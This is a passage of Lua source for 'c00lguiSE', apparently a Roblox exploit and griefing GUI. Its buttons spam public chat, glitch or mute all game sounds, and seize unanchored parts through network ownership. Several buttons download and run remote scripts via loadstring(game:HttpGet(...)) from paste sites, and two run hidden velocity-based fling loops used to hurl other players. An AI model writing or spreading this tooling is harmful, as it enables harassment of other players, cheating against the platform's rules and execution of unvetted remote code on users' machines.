		button.Text = glitchEnabled and "Glitch Sounds: ON" or "Glitch Sounds: OFF"
	
		local function glitchSound(sound)
			if not glitchEnabled then
				sound:SetAttribute("IsGlitching", false)
				return
			end
			if not sound:IsA("Sound") or sound:GetAttribute("IsGlitching") then return end
	
			sound:SetAttribute("IsGlitching", true)
			sound:Play()
	
			local conn
			conn = RunService.Heartbeat:Connect(function()
				if not glitchEnabled or not sound or not sound:IsDescendantOf(game) then
					conn:Disconnect()
					sound:SetAttribute("IsGlitching", false)
					return
				end
	
				if sound.IsPlaying then
					local d = sound.TimeLength
					if d > 0 then
						local t = math.random(1,5)
						local p
						if t == 1 then
							p = math.random() * d
						elseif t == 2 then
							p = math.clamp(sound.TimePosition - math.random(150,500)/1000, 0, d)
						elseif t == 3 then
							p = math.clamp(sound.TimePosition + math.random(200,700)/1000, 0, d)
						elseif t == 4 then
							p = math.random() * d
						else
							p = 0
						end
						sound.TimePosition = p
					end
				end
			end)
		end
	
		if glitchEnabled then
			for _, v in ipairs(game:GetDescendants()) do
				if v:IsA("Sound") then
					glitchSound(v)
				end
			end
	
			addedConn = game.DescendantAdded:Connect(function(d)
				if d:IsA("Sound") then
					glitchSound(d)
				end
			end)
		else
			if addedConn then
				addedConn:Disconnect()
				addedConn = nil
			end
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_ea);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_ec()
local script = G2L["ec"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local RunService = game:GetService("RunService")
	
	local muted = false
	local addedConn
	
	if game:GetService("SoundService").RespectFilteringEnabled == true then
	button.Visible = false
	end
	
	function click()
		muted = not muted
		button.Text = muted and "Mute Sounds: ON" or "Mute Sounds: OFF"
	
		if muted then
			for _, v in pairs(game:GetDescendants()) do
				if v:IsA("Sound") then
					pcall(function()
						v:Stop()
					end)
				end
			end
	
			addedConn = game.DescendantAdded:Connect(function(obj)
				if obj:IsA("Sound") then
					pcall(function()
						obj:Stop()
					end)
				end
			end)
		else
			if addedConn then
				addedConn:Disconnect()
				addedConn = nil
			end
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_ec);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_ee()
local script = G2L["ee"];
	local button = script.Parent
	local lyrics = {
		"Spooky Scary Skeletons",
		"Send shivers down your spine",
		"Shrieking skulls will shock your soul",
		"Seal your doom tonight",
		"Spooky Scary Skeletons",
		"Speak with such a screech",
		"You'll shake and shudder in surprise",
		"When you hear these zombies shriek",
		"We're so sorry skeletons",
		"You're so misunderstood",
		"You only want to socialize",
		"But I don't think we should",
		"Cause spooky scary skeletons",
		"Shout startling shrilly screams",
		"They'll sneak from their sarcophagus",
		"And just won't leave you be."
	}
	
	local function sendMessage(message)
		local chatService = game:GetService("TextChatService")
		local replicatedStorage = game:GetService("ReplicatedStorage")
	
		if chatService and chatService.ChatVersion == Enum.ChatVersion.TextChatService then
			local chatEvent = chatService:FindFirstChild("TextChannels")
			if chatEvent and chatEvent.RBXGeneral then
				chatEvent.RBXGeneral:SendAsync(message)
			end
		else
			local chatEvent = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
			if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
				chatEvent.SayMessageRequest:FireServer(message, "All")
			end
		end
	end
	
	function click()
		local function singLyrics()
			for _, lyric in ipairs(lyrics) do
				sendMessage(lyric)
				wait(2.5)
			end
		end
		singLyrics()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_ee);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_f0()
local script = G2L["f0"];
	local button = script.Parent
	
	
	
	
	function click()
		local delay = 2.5
		function send(text)
			local A_delay = text
			local A_2 = "All"
			local event = game.TextChatService.TextChannels.RBXGeneral
			event:SendAsync(A_delay, A_2)
	
		end
	
		send("We're no strangers to love")
		wait(delay)
		send("You know the rules, and so do I")
		wait(delay)
		send("A full commitment's what I'm thinking of")
		wait(delay)
		send("You wouldn't get this from any other guy")
		wait(delay)
		send("I just wanna tell you how I'm feeling")
		wait(delay)
		send("Gotta make you understand")
		wait(delay)
		send("Never gonna give you up")
		wait(delay)
		send("Never gonna let you down")
		wait(delay)
		send("Never gonna run around and desert you")
		wait(delay)
		send("Never gonna make you cry")
		wait(delay)
		send("Never gonna say goodbye")
		wait(delay)
		send("Never gonna tell a lie and hurt you")
		wait(delay)
		send("We've known each other for so long")
		wait(delay)
		send("Your heart's been aching but you're too shy to say it")
		wait(delay)
		send("Inside we both know what's been going on")
		wait(delay)
		send("We know the game and we're gonna play it")
		wait(delay)
		send("And if you ask me how I'm feeling")
		wait(delay)
		send("Don't tell me you're too blind to see")
		wait(delay)
		send("Never gonna give you up")
		wait(delay)
		send("Never gonna let you down")
		wait(delay)
		send("Never gonna run around and desert you")
		wait(delay)
		send("Never gonna make you cry")
		wait(delay)
		send("Never gonna say goodbye")
		wait(delay)
		send("Never gonna tell a lie and hurt you")
		wait(delay)
		send("Never gonna give you up")
		wait(delay)
		send("Never gonna let you down")
		wait(delay)
		send("Never gonna run around and desert you")
		wait(delay)
		send("Never gonna make you cry")
		wait(delay)
		send("Never gonna say goodbye")
		wait(delay)
		send("Never gonna tell a lie and hurt you")
		wait(delay)
		send("Never gonna give, never gonna give (Give you up)")
		wait(delay)
		send("We've known each other for so long")
		wait(delay)
		send("Your heart's been aching but you're too shy to say it")
		wait(delay)
		send("Inside we both know what's been going on")
		wait(delay)
		send("We know the game and we're gonna play it")
		wait(delay)
		send("I just wanna tell you how I'm feeling")
		wait(delay)
		send("Gotta make you understand")
		wait(delay)
		send("Never gonna give you up")
		wait(delay)
		send("Never gonna let you down")
		wait(delay)
		send("Never gonna run around and desert you")
		wait(delay)
		send("Never gonna make you cry")
		wait(delay)
		send("Never gonna say goodbye")
		wait(delay)
		send("Never gonna tell a lie and hurt you")
		wait(delay)
		send("Never gonna give you up")
		wait(delay)
		send("Never gonna let you down")
		wait(delay)
		send("Never gonna run around and desert you")
		wait(delay)
		send("Never gonna make you cry")
		wait(delay)
		send("Never gonna say goodbye")
		wait(delay)
		send("Never gonna tell a lie and hurt you")
		wait(delay)
		send("Never gonna give you up")
		wait(delay)
		send("Never gonna let you down")
		wait(delay)
		send("Never gonna run around and desert you")
		wait(delay)
		send("Never gonna make you cry")
		wait(delay)
		send("Never gonna say goodbye")
		wait(delay)
		send("Never gonna tell a lie and hurt you")
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_f0);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_f2()
local script = G2L["f2"];
	local button = script.Parent
	
	function click()
	
		local function sendMessage(message)
			local chatService = game:GetService("TextChatService")
			local replicatedStorage = game:GetService("ReplicatedStorage")
	
			if chatService and chatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local chatEvent = chatService:FindFirstChild("TextChannels")
				if chatEvent and chatEvent.RBXGeneral then
					chatEvent.RBXGeneral:SendAsync(message)
				end
			else
				local chatEvent = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
				if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
					chatEvent.SayMessageRequest:FireServer(message, "All")
				end
			end
		end
	
	
		sendMessage("Ima do it.")
		wait(2)
		sendMessage("I will oof.")
		wait(2)
		sendMessage("Goodbye.")
		wait(1)
		local LocalPlayer = game:GetService("Players").LocalPlayer
		LocalPlayer.Character.Humanoid:MoveTo(LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 10)
		LocalPlayer.Character.Humanoid.Jump = true
		wait(0.5)
		function Iterate(instance, func)
			for i, v in next, instance:GetChildren() do
				func(v)
			end
		end
		limbs = {
			["Right Leg"] = true;
			["Right Arm"] = true;
			["Left Leg"] = true;
			["Left Arm"] = true;
		}
		Iterate(LocalPlayer.Character, function(v)
			if v:IsA("BasePart") then
				local attachment = Instance.new("Attachment")
				attachment.Parent = v
				attachment.Name = (v.Name .. "[Attachment]")
				if limbs[v.Name] then
					attachment.Position = Vector3.new(0, v.Size.Y/2, 0)
				elseif v.Name == "Head" then
					attachment.Position = Vector3.new(0, -v.Size.Y/2, 0)
					attachment.Rotation = Vector3.new(0, 0, -90)
				end
			end
		end)
		local leftLegAttachment = Instance.new("Attachment")
		leftLegAttachment.Position = Vector3.new(-.5, -1, 0)
		leftLegAttachment.Rotation = Vector3.new(0, -90, 0)
		local rightLegAttachment = Instance.new("Attachment")
		rightLegAttachment.Position = Vector3.new(.5, -1, 0)
		rightLegAttachment.Rotation = Vector3.new(0, -90, 0)
		rightLegAttachment.Parent, leftLegAttachment.Parent = LocalPlayer.Character.Torso, LocalPlayer.Character.Torso
		jointAttachments = {
			['Head'] = {
				['Attachment0'] = LocalPlayer.Character.Torso['NeckAttachment'];
				['Attachment1'] = LocalPlayer.Character.Head['Head[Attachment]'];
			};
			['Left Arm'] = {
				['Attachment0'] = LocalPlayer.Character.Torso['LeftCollarAttachment'];
				['Attachment1'] = LocalPlayer.Character['Left Arm']['Left Arm[Attachment]'];
			};
			['Right Arm'] = {
				['Attachment0'] = LocalPlayer.Character.Torso['RightCollarAttachment'];
				['Attachment1'] = LocalPlayer.Character['Right Arm']['Right Arm[Attachment]'];
			};
			['Left Leg'] = {
				['Attachment0'] = leftLegAttachment;
				['Attachment1'] = LocalPlayer.Character['Left Leg']['Left Leg[Attachment]'];
			};
			['Right Leg'] = {
				['Attachment0'] = rightLegAttachment;
				['Attachment1'] = LocalPlayer.Character['Right Leg']['Right Leg[Attachment]'];
			};
		}
		LocalPlayer.Character.Humanoid.PlatformStand = true
		Iterate(LocalPlayer.Character, function(v)
			if v:IsA("BasePart") then
				if jointAttachments[v.Name] then
					local ballSocketJoint = Instance.new("BallSocketConstraint")
					ballSocketJoint.Parent = v
					ballSocketJoint.Radius = 0.15
					ballSocketJoint.Attachment0, ballSocketJoint.Attachment1 = jointAttachments[v.Name]['Attachment0'], jointAttachments[v.Name]['Attachment1']
				end
			end
		end)
		Iterate(LocalPlayer.Character.Torso, function(v)
			if v:IsA("Motor") then
				v:Remove()
			end
		end)
	
		for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
			if part:IsA("BasePart") and part.CanCollide then
				LocalPlayer.Character.Humanoid.Health = 0
				break
			end
		end
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_f2);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_f4()
local script = G2L["f4"];
	local button = script.Parent
	
	function click()
		if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").RigType == Enum.HumanoidRigType.R6 then
	
			game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = 60
			game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").JumpPower = 20
			game:GetService("Players").LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "rbxassetid://129342287"
			game:GetService("Players").LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "rbxassetid://129342287"
			game:GetService("Players").LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "rbxassetid://129342287"
			game:GetService("Players").LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "rbxassetid://129342287"
			game:GetService("Players").LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "rbxassetid://129342287"
			game:GetService("Players").LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "rbxassetid://129342287"
			for i, thing in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
				if thing.ClassName == "Part" then
					thing.CustomPhysicalProperties = PhysicalProperties.new(0.04, 0, 0)
				end
			end
			local r6height = "-1.03"
			game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").HipHeight = r6height
	
		elseif game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").RigType == Enum.HumanoidRigType.R15 then
			game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = 60
			game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").JumpPower = 20
			game:GetService("Players").LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "rbxassetid://3360694441"
			game:GetService("Players").LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "rbxassetid://3360694441"
			game:GetService("Players").LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "rbxassetid://3360694441"
			game:GetService("Players").LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "rbxassetid://3360694441"
			game:GetService("Players").LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "rbxassetid://3360694441"
			game:GetService("Players").LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "rbxassetid://3360694441"
			for i, thing in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
				if thing.ClassName == "MeshPart" then
					thing.CustomPhysicalProperties = PhysicalProperties.new(0.04, 0, 0)
				end
			end
			local r15height = "0.56"
			game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").HipHeight = r15height
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_f4);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_f6()
local script = G2L["f6"];
	local button = script.Parent
	
	function click()
	
		wait(5)
	
	--[[ Info ]]--
	
	local ver = "2.00"
	local scriptname = "feFlip"
	
	
	--[[ Keybinds ]]--
	
	local FrontflipKey = Enum.KeyCode.Z
	local BackflipKey = Enum.KeyCode.X
	local AirjumpKey = Enum.KeyCode.C
	
	
	--[[ Dependencies ]]--
	
	local ca = game:GetService("ContextActionService")
	local zeezy = game:GetService("Players").LocalPlayer
	local h = 0.0174533
	local antigrav
	
	
	--[[ Functions ]]--
	
	function zeezyFrontflip(act,inp,obj)
		if inp == Enum.UserInputState.Begin then
			zeezy.Character.Humanoid:ChangeState("Jumping")
			wait()
			zeezy.Character.Humanoid.Sit = true
			for i = 1,360 do 
				delay(i/720,function()
					zeezy.Character.Humanoid.Sit = true
					zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h,0,0)
				end)
			end
			wait(0.55)
			zeezy.Character.Humanoid.Sit = false
		end
	end
	
	function zeezyBackflip(act,inp,obj)
		if inp == Enum.UserInputState.Begin then
			zeezy.Character.Humanoid:ChangeState("Jumping")
			wait()
			zeezy.Character.Humanoid.Sit = true
			for i = 1,360 do
				delay(i/720,function()
					zeezy.Character.Humanoid.Sit = true
					zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h,0,0)
				end)
			end
			wait(0.55)
			zeezy.Character.Humanoid.Sit = false
		end
	end
	
	function zeezyAirjump(act,inp,obj)
		if inp == Enum.UserInputState.Begin then
			zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
			wait()
			zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")	
		end
	end
	
	
	--[[ Binds ]]--
	
	ca:BindAction("zeezyFrontflip",zeezyFrontflip,false,FrontflipKey)
	ca:BindAction("zeezyBackflip",zeezyBackflip,false,BackflipKey)
	ca:BindAction("zeezyAirjump",zeezyAirjump,false,AirjumpKey)
	
	--[[ Load Message ]]--
	
	print(scriptname .. " " .. ver .. " loaded successfully")
	print("made by Zeezy#7203")
	
	local notifSound = Instance.new("Sound",workspace)
	notifSound.PlaybackSpeed = 1.5
	notifSound.Volume = 0.15
	notifSound.SoundId = "rbxassetid://170765130"
	notifSound.PlayOnRemove = true
	notifSound:Destroy()
	game.StarterGui:SetCore("SendNotification", {Title = "feFlip", Text = "feFlip loaded successfully!", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_f6);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_f8()
local script = G2L["f8"];
	local button = script.Parent
	
	function click()
		local UserInputService = game:GetService("UserInputService")
		local RunService = game:GetService("RunService")
		local Camera = workspace.CurrentCamera
	
		local SPEED_MULTIPLIER = 30
		local JUMP_POWER = 60
		local JUMP_GAP = 0.3
		local delta = 1
	
		local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
	
		for i, v in ipairs(character:GetDescendants()) do
			if v:IsA("BasePart") then
				v.CanCollide = false
				v.Transparency = 0
			end
		end
	
		local ball = character:WaitForChild("HumanoidRootPart")
		ball.Shape = Enum.PartType.Ball
		ball.Material = Enum.Material.SmoothPlastic
		ball.Size = Vector3.new(5, 5, 5)
		ball.Transparency = 0.75
	
		local humanoid = character:WaitForChild("Humanoid")
		local params = RaycastParams.new()
		params.FilterType = Enum.RaycastFilterType.Blacklist
		params.FilterDescendantsInstances = {character}
	
		local function updateMovement()
			local movement = Vector3.new(0, 0, 0)
	
			if UserInputService:IsKeyDown(Enum.KeyCode.A) then
				movement -= Camera.CFrame.LookVector
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.D) then
				movement += Camera.CFrame.LookVector
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.W) then
				movement -= Camera.CFrame.RightVector
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.S) then
				movement += Camera.CFrame.RightVector
			end
	
			if movement.Magnitude > 0 then
				movement = movement.Unit * SPEED_MULTIPLIER
				ball.RotVelocity = Vector3.new(movement.X, ball.RotVelocity.Y, movement.Z)
			end
		end
	
		local movementConnection = RunService.RenderStepped:Connect(function(delta)
			ball.CanCollide = true
			humanoid.PlatformStand = true
	
			if not UserInputService:GetFocusedTextBox() then
				updateMovement()
			end
		end)
	
		UserInputService.JumpRequest:Connect(function()
			local result = workspace:Raycast(
				ball.Position,
				Vector3.new(0, -((ball.Size.Y / 2) + JUMP_GAP), 0),
				params
			)
	
			if result then
				ball.Velocity = ball.Velocity + Vector3.new(0, JUMP_POWER, 0)
			end
		end)
	
		Camera.CameraSubject = ball
		humanoid.Died:Connect(function()
			movementConnection:Disconnect()
		end)
	
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_f8);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_fa()
local script = G2L["fa"];
	local button = script.Parent
	
	
	function click()
		--- [R6] FE salute ---
		--- Edited by nul#3174 ---
		--- Credits to the unknown original creator ---
	
		local UIS = game:GetService("UserInputService")
		local Posed = false
		local Player = game.Players.LocalPlayer
		local Animation = Instance.new("Animation")
		Animation.AnimationId = "rbxassetid://186434728"
		local Track = Player.Character.Humanoid:LoadAnimation(Animation)
	
	
		local function onRan()
			UIS.InputBegan:Connect(function(input, gameProcessed)
				if input.KeyCode == Enum.KeyCode.H and not Posed and UIS:GetFocusedTextBox() == nil then
					Posed = true
					Track:Play()
					wait(.05)
					Track:AdjustSpeed(0)
				elseif input.KeyCode == Enum.KeyCode.H and Posed and UIS:GetFocusedTextBox() == nil then
					Posed = false
					Track:Stop()
				end
			end)
		end
	
		onRan()
	
		local function onDeath()
			Player.CharacterAdded:Wait()
			repeat wait() until Player.Character:FindFirstChild("Humanoid")
			Track = Player.Character.Humanoid:LoadAnimation(Animation)
			UIS.InputBegan:Connect(function(input, gameProcessed)
				if input.KeyCode == Enum.KeyCode.H and not Posed and UIS:GetFocusedTextBox() == nil then
					Posed = true
					Track:Play()
					wait(.05)
					Track:AdjustSpeed(0)
				elseif input.KeyCode == Enum.KeyCode.H and Posed and UIS:GetFocusedTextBox() == nil then
					Posed = false
					Track:Stop()
				end
			end)
		end
	
		Player.Character:WaitForChild("Humanoid").Died:Connect(function()
			onDeath()
			onRan()
		end)
	
		Player.CharacterAdded:Connect(function()
			onDeath()
			onRan()
		end)
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_fa);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_fc()
local script = G2L["fc"];
	local button = script.Parent
	local Players = game.Players
	local CollectionService = game.CollectionService
	local RunService = game.RunService
	
	
	function click()
		local radius = button.Parent.Parent.Settings.OrbitRadiusInput
		local height = 3
		local orbitSpeed = button.Parent.Parent.Settings.OrbitSpeedInput
		
		if radius.Text == "" then radius.Text = "20" end
		if orbitSpeed == "" then orbitSpeed.Text = "2" end
	
		local speaker = Players.LocalPlayer
		local character = speaker.Character or speaker.CharacterAdded:Wait()
		local root = character:FindFirstChild("HumanoidRootPart")
		if not root then
			warn("HumanoidRootPart not found for player:", speaker.Name)
			return
		end
	
		local orbitParts = {}
		local orbitConnections = {}
	
		local function hasWeld(part)
			local connected = part:GetConnectedParts(true)
			if #connected > 1 then
				return true
			end
	
			for _, obj in ipairs(part:GetDescendants()) do
				if obj:IsA("Weld") or obj:IsA("WeldConstraint") or obj:IsA("Motor6D") then
					return true
				end
			end
	
			return false
		end
	
	
		local function addPart(part)
			if orbitParts[part] then return end
	
			CollectionService:AddTag(part, "OrbitPart")
			part.CanCollide = false
	
			if part:CanSetNetworkOwnership() then
				part:SetNetworkOwner(speaker)
			end
	
			local bodyGyro = Instance.new("BodyGyro")
			bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
			bodyGyro.P = 1e4
			bodyGyro.Parent = part
	
			local bodyVel = Instance.new("BodyVelocity")
			bodyVel.MaxForce = Vector3.new(1e5, 1e5, 1e5)
			bodyVel.P = 1e4
			bodyVel.Parent = part
	
			local angle = math.random() * math.pi * 2
	
			local conn
			conn = RunService.Heartbeat:Connect(function(dt)
				if not root or not root.Parent or not part.Parent then
					conn:Disconnect()
					return
				end
	
				angle += orbitSpeed * dt
	
				local orbitCenter = root.Position
				local orbitPoint = orbitCenter + Vector3.new(
					math.cos(angle) * radius,
					height,
					math.sin(angle) * radius
				)
	
				local tangent = Vector3.new(
					-math.sin(angle),
					0,
					math.cos(angle)
				).Unit * orbitSpeed * radius
	
				bodyVel.Velocity = tangent
				bodyGyro.CFrame = CFrame.new(part.Position, orbitCenter)
				part.Position = orbitPoint
			end)
	
			orbitParts[part] = true
			orbitConnections[part] = conn
		end
	
	
		local scanConnection
		scanConnection = RunService.Heartbeat:Connect(function()
			if not root or not root.Parent then
				scanConnection:Disconnect()
				return
			end
	
			local origin = root.Position
	
			for _, part in ipairs(workspace:GetDescendants()) do
				if part:IsA("BasePart")
					and not part.Anchored
					and not part:IsDescendantOf(workspace.Terrain)
					and not hasWeld(part)
					and not orbitParts[part]
				then
	
					local isInCharacter = false
					for _, player in ipairs(Players:GetPlayers()) do
						local char = player.Character
						if char and part:IsDescendantOf(char) then
							isInCharacter = true
							break
						end
					end
	
					if not isInCharacter and (part.Position - origin).Magnitude <= radius then
						addPart(part)
					end
				end
			end
		end)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_fc);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_fe()
local script = G2L["fe"];
	local button = script.Parent
	
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/mizu-dump/Krystal-DanceV4/refs/heads/main/source.lua"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_fe);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_100()
local script = G2L["100"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://pastefy.app/59mJGQGe/raw"))()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Touch-fling-10457"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_100);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_102()
local script = G2L["102"];
	local button = script.Parent
	
	button.MouseButton1Click:connect(function()
	
		loadstring(game:HttpGet("https://pastefy.app/JOWniO6o/raw"))()
	
		if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
			hiddenfling = true
		else
			hiddenfling = true
			detection = Instance.new("Decal")
			detection.Name = "juisdfj0i32i0eidsuf0iok"
			detection.Parent = game:GetService("ReplicatedStorage")
			local function fling()
				local hrp, c, vel, movel = nil, nil, nil, 0.1
				while true do
					game:GetService("RunService").Heartbeat:Wait()
					if hiddenfling then
						local lp = game.Players.LocalPlayer
						while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
							game:GetService("RunService").Heartbeat:Wait()
							c = lp.Character
							hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
						end
						if hiddenfling then
							vel = hrp.Velocity
							hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
							game:GetService("RunService").RenderStepped:Wait()
							if c and c.Parent and hrp and hrp.Parent then
								hrp.Velocity = vel
							end
							game:GetService("RunService").Stepped:Wait()
							if c and c.Parent and hrp and hrp.Parent then
								hrp.Velocity = vel + Vector3.new(0, movel, 0)
								movel = movel * -1
							end
						end
					end
				end
			end
	
			fling()
		end
	end)
end;
task.spawn(C_102);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_104()
local script = G2L["104"];
	local button = script.Parent
	--local input = CoolGui.Frame.Settings
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://pastefy.app/YsJgITXR/raw"))()
	
		if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
			hiddenfling = true
		else
			hiddenfling = true
			detection = Instance.new("Decal")
			detection.Name = "juisdfj0i32i0eidsuf0iok"
			detection.Parent = game:GetService("ReplicatedStorage")
			local function fling()
				local hrp, c, vel, movel = nil, nil, nil, 0.1
				while true do
					game:GetService("RunService").Heartbeat:Wait()
					if hiddenfling then
						local lp = game.Players.LocalPlayer
						while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
							game:GetService("RunService").Heartbeat:Wait()
							c = lp.Character
							hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
						end
						if hiddenfling then
							vel = hrp.Velocity
							hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
							game:GetService("RunService").RenderStepped:Wait()
							if c and c.Parent and hrp and hrp.Parent then
								hrp.Velocity = vel
							end
							game:GetService("RunService").Stepped:Wait()
							if c and c.Parent and hrp and hrp.Parent then
								hrp.Velocity = vel + Vector3.new(0, movel, 0)
								movel = movel * -1
							end
						end
					end
				end
			end
	
			fling()
		end
	end)
end;
task.spawn(C_104);
-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
local function C_106()
local script = G2L["106"];
	local button = script.Parent
	--local input = CoolGui.Frame.Settings
	
	button.MouseButton1Click:connect(function()
		------------
		--John Doe--
		------------
		-----by-----
		--CKbackup--
		------------
		
		intro = true
		
		if intro == true then
		local function send(text)
			local A_delay = text
			local A_2 = "All"
			local event = game.TextChatService.TextChannels.RBXGeneral
			event:SendAsync(A_delay, A_2)
	
		end
	
		send("He's back... Your overlord is back...")
		wait(3)
		send("Good luck, you'll need it.")
		wait(3)
		send("They're all yours, Mr. Doe.")
		wait(3)
		end
	
		--Anti Fling--
		AntiFling = true
	
		local function NoCollision(PLR)
			if AntiFling and PLR.Character then
				for _,x in pairs(PLR.Character:GetDescendants()) do
					if x:IsA("BasePart") and x.CanCollide then
						x.CanCollide = false
					end
				end
			end
		end
		for _,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players then
				local antifling = game:GetService('RunService').Stepped:connect(function()
					NoCollision(v)
				end)
			end
		end
		game.Players.PlayerAdded:Connect(function()
			if v ~= game.Players.LocalPlayer and antifling then
				local antifling = game:GetService('RunService').Stepped:connect(function()
					NoCollision(v)
				end)
			end
		end)
	
	
		--Player Stuff--
		player = game:GetService("Players").LocalPlayer
		chara = player.Character
	
		ch = chara:GetChildren()
		for i = 1, #ch do
			if ch[i].Name == "Torso" then
				ch[i].roblox.Transparency = 1
			elseif ch[i].Name == "Head" then
				ch[i].face.Transparency = 1
				ch[i].Transparency = 1
			elseif ch[i].ClassName == "Accessory" or ch[i].ClassName == "Shirt" or ch[i].ClassName == "Pants" or ch[i].ClassName == "ShirtGraphic" then
				ch[i]:Destroy()
			end
		end
	
		chara["Left Arm"].BrickColor = BrickColor.new("Cool yellow")
		chara["Right Arm"].BrickColor = BrickColor.new("Cool yellow")
		chara["Left Leg"].BrickColor = BrickColor.new("Medium blue")
		chara["Right Leg"].BrickColor = BrickColor.new("Medium blue")
		chara.Torso.BrickColor = BrickColor.new("Bright yellow")
	
		--Outfit--
		New = function(Object, Parent, Name, Data)
			local Object = Instance.new(Object)
			for Index, Value in pairs(Data or {}) do
				Object[Index] = Value
			end
			Object.Parent = Parent
			Object.Name = Name
			return Object
		end
	
		function ScatterEff(part)
			local eff1 = Instance.new("ParticleEmitter",part)
			eff1.Size = NumberSequence.new(.1)
			eff1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.9,0),NumberSequenceKeypoint.new(1,1)})
			eff1.LightEmission = 1
			eff1.Lifetime = NumberRange.new(1)
			eff1.Speed = NumberRange.new(1)
			eff1.Rate = 100
			eff1.VelocitySpread = 10000
			eff1.Texture = "rbxassetid://347504241"
			eff1.Color = ColorSequence.new(Color3.new(1,0,0))
			local eff2 = Instance.new("ParticleEmitter",part)
			eff2.Size = NumberSequence.new(.1)
